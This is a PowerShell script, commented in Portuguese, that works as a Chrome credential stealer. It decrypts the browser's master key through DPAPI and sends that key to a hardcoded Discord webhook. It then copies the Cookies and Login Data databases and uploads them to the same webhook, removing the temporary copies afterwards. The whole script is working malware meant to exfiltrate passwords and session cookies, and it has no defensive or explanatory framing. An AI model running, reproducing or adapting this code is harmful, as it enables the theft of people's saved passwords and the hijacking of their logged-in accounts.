$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

try {
    $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    # Procura o Local State em todas as subpastas para não ter erro
    $ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1
    
    $json = Get-Content $ls.FullName -Raw | ConvertFrom-Json
    $encKey = $json.os_crypt.encrypted_key
    $bytes = [Convert]::FromBase64String($encKey)
    $trimmed = $bytes[5..($bytes.Length - 1)]

    Add-Type -AssemblyName System.Security
    # Forçamos o escopo de usuário de forma bem direta
    $entropy = $null
    $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmed, $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
    $finalKey = [Convert]::ToBase64String($unprotected)
    
    # Se a chave começar com 'DPAPI', algo deu errado na limpeza
    curl.exe -X POST -F "content=🔑 CHAVE_PRONTA_NOVA: $finalKey" $u

} catch {
    $erroDetalhado = $_.Exception.Message
    curl.exe -X POST -F "content=❌ ERRO NA CHAVE: $erroDetalhado" $u
}

    # 4. Envia os arquivos (Cookies e Senhas)
    $paths = @(
        (Get-ChildItem -Path $base -Recurse -Filter "Cookies" | Where-Object { $_.FullName -like "*Network*" } | Select-Object -First 1),
        (Get-ChildItem -Path $base -Recurse -Filter "Login Data" | Select-Object -First 1)
    )

    foreach ($file in $paths) {
        if ($file) {
            $temp = "$env:TEMP\" + $file.Name + ".db"
            Copy-Item $file.FullName $temp -Force
            # Usando -X POST -F aqui também para garantir o envio do arquivo
            curl.exe -X POST -F "file=@$temp" $u
            Remove-Item $temp -Force
        }
    }
} catch {
    $err = $_.Exception.Message
    curl.exe -X POST -F "content=❌ Erro Geral: $err" $u
}
exit
